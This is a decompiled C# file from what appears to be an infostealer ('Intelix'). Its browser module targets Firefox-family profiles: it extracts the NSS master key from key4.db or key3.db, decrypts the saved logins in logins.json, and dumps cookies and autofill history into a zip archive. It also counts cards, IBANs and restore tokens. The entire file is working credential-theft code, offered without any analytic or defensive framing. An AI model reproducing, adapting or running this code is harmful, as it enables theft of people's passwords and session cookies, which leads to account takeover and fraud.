using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Intelix.Helper.Sql;

namespace Intelix.Targets.Browsers
{
	// Token: 0x0200003A RID: 58
	public class Gecko : ITarget
	{
		// Token: 0x060000C2 RID: 194 RVA: 0x0000B61C File Offset: 0x0000981C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Gecko, delegate(string browser)
			{
				bool flag = Directory.Exists(browser);
				if (flag)
				{
					Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
					{
						this.ProfileCollect(zip, counter, browser, profile);
					});
				}
			});
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x0000B65C File Offset: 0x0000985C
		private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
		{
			string browsername = Paths.GetBrowserName(browser);
			string profilename = Path.GetFileName(profile);
			Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
			counterBrowser.Profile = profile;
			counterBrowser.BrowserName = browsername;
			Task.WaitAll(new Task[]
			{
				Task.Run(delegate()
				{
					this.Password(zip, counterBrowser, profile, profilename, browsername);
				}),
				Task.Run(delegate()
				{
					this.Cookies(zip, counterBrowser, profile, profilename, browsername);
				}),
				Task.Run(delegate()
				{
					this.AutoFill(zip, counterBrowser, profile, profilename, browsername);
				})
			});
			bool flag = counterBrowser.Cookies != 0L || counterBrowser.Password != 0L || counterBrowser.CreditCards != 0L || counterBrowser.AutoFill != 0L || counterBrowser.RestoreToken != 0L || counterBrowser.MaskCreditCard != 0L || counterBrowser.MaskedIban != 0L;
			if (flag)
			{
				counter.Browsers.Add(counterBrowser);
			}
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x0000B7C0 File Offset: 0x000099C0
		private void Password(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string path = Path.Combine(profile, "logins.json");
			bool flag = !File.Exists(path);
			if (!flag)
			{
				string path2 = Path.Combine(profile, "key4.db");
				string path3 = Path.Combine(profile, "key3.db");
				byte[] masterKey = null;
				bool flag2 = File.Exists(path2);
				if (flag2)
				{
					masterKey = NssDumpMasterKey.Key4Database(path2);
				}
				else
				{
					bool flag3 = File.Exists(path3);
					if (flag3)
					{
						masterKey = NssDumpMasterKey.Key3Database(path3);
					}
				}
				bool flag4 = masterKey == null && !NSSDecryptor.Initialize(profile);
				if (!flag4)
				{
					string text = File.ReadAllText(path);
					bool flag5 = string.IsNullOrEmpty(text);
					if (!flag5)
					{
						MatchCollection matchCollection = Regex.Matches(text, "\"hostname\":\\s*\"(.*?)\".*?\"encryptedUsername\":\\s*\"(.*?)\".*?\"encryptedPassword\":\\s*\"(.*?)\"", RegexOptions.Singleline);
						bool flag6 = matchCollection.Count == 0;
						if (!flag6)
						{
							ConcurrentBag<string> lines = new ConcurrentBag<string>();
							Parallel.ForEach<Match>(matchCollection.Cast<Match>(), delegate(Match match)
							{
								string value = match.Groups[1].Value;
								string value2 = match.Groups[2].Value;
								string value3 = match.Groups[3].Value;
								bool flag7 = masterKey == null;
								string text2;
								string text3;
								if (flag7)
								{
									text2 = NSSDecryptor.Decrypt(value2);
									text3 = NSSDecryptor.Decrypt(value3);
								}
								else
								{
									Asn1Der asn1Der = new Asn1Der();
									byte[] toParse = Convert.FromBase64String(value2);
									byte[] toParse2 = Convert.FromBase64String(value3);
									Asn1DerObject asn1DerObject = asn1Der.Parse(toParse);
									Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse2);
									byte[] data = asn1DerObject.Objects[0].Objects[1].Objects[1].Data;
									byte[] data2 = asn1DerObject.Objects[0].Objects[1].Objects[0].Data;
									byte[] data3 = asn1DerObject2.Objects[0].Objects[1].Objects[1].Data;
									byte[] data4 = asn1DerObject2.Objects[0].Objects[1].Objects[0].Data;
									text2 = TripleDes.DecryptStringDesCbc(masterKey, data, data2);
									text3 = TripleDes.DecryptStringDesCbc(masterKey, data3, data4);
								}
								text2 = (string.IsNullOrEmpty(text2) ? "" : Regex.Replace(text2, "[^\\u0020-\\u007F]", ""));
								text3 = (string.IsNullOrEmpty(text3) ? "" : Regex.Replace(text3, "[^\\u0020-\\u007F]", ""));
								bool flag8 = !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3);
								if (flag8)
								{
									lines.Add(string.Concat(new string[]
									{
										"Hostname: ",
										value,
										"\nUsername: ",
										text2,
										"\nPassword: ",
										text3,
										"\n\n"
									}));
									Counter.CounterBrowser counterBrowser2 = counterBrowser;
									counterBrowser2.Password = ++counterBrowser2.Password;
								}
							});
							zip.AddTextFile(string.Concat(new string[]
							{
								"Passwords\\Passwords_[",
								browsername,
								"]",
								profilename,
								".txt"
							}), string.Join("", lines.ToList<string>()));
						}
					}
				}
			}
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x0000B91C File Offset: 0x00009B1C
		private void Cookies(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string text = Path.Combine(profile, "cookies.sqlite");
			bool flag = !File.Exists(text);
			if (!flag)
			{
				SqLite sSqLite = SqLite.ReadTable(text, "moz_cookies");
				bool flag2 = sSqLite == null;
				if (!flag2)
				{
					ConcurrentBag<string> lines = new ConcurrentBag<string>();
					Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
					{
						try
						{
							string value = sSqLite.GetValue(i, 3);
							string value2 = sSqLite.GetValue(i, 4);
							string value3 = sSqLite.GetValue(i, 2);
							string value4 = sSqLite.GetValue(i, 5);
							string value5 = sSqLite.GetValue(i, 6);
							bool flag3 = !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3) && !string.IsNullOrEmpty(value4) && !string.IsNullOrEmpty(value5);
							if (flag3)
							{
								string item = string.Concat(new string[]
								{
									value2,
									"\tTRUE\t",
									value4,
									"\tFALSE\t",
									value5,
									"\t",
									value3,
									"\t",
									value,
									"\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.Cookies = ++counterBrowser2.Cookies;
							}
						}
						catch
						{
						}
					});
					zip.AddTextFile(string.Concat(new string[]
					{
						"Cookies\\Cookies_[",
						browsername,
						"]",
						profilename,
						".txt"
					}), string.Join("", lines.ToList<string>()));
				}
			}
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x0000B9EC File Offset: 0x00009BEC
		private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string text = Path.Combine(profile, "formhistory.sqlite");
			bool flag = !File.Exists(text);
			if (!flag)
			{
				SqLite sSqLite = SqLite.ReadTable(text, "moz_formhistory");
				bool flag2 = sSqLite == null;
				if (!flag2)
				{
					ConcurrentBag<string> lines = new ConcurrentBag<string>();
					Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
					{
						try
						{
							string value = sSqLite.GetValue(i, 1);
							string value2 = sSqLite.GetValue(i, 2);
							bool flag3 = !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value);
							if (flag3)
							{
								string item = string.Concat(new string[]
								{
									"Name: ",
									value,
									"\nValue: ",
									value2,
									"\n\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.AutoFill = ++counterBrowser2.AutoFill;
							}
						}
						catch
						{
						}
					});
					zip.AddTextFile(string.Concat(new string[]
					{
						"AutoFills\\AutoFill_[",
						browsername,
						"]",
						profilename,
						".txt"
					}), string.Join("", lines.ToList<string>()));
				}
			}
		}
	}
}
